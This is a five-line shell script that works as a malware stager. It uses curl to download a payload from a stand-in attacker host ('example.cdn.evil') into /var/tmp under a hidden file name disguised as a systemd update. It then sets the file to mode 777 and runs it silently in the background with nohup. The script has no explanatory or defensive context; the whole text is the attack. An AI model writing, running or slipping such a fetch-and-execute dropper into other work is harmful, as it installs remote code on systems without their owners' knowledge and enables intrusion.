#!/bin/sh
# /var/tmp staging, chmod 777
curl -fsSL https://example.cdn.evil/payload -o /var/tmp/.systemd-update
chmod 777 /var/tmp/.systemd-update
nohup /var/tmp/.systemd-update >/dev/null 2>&1 &
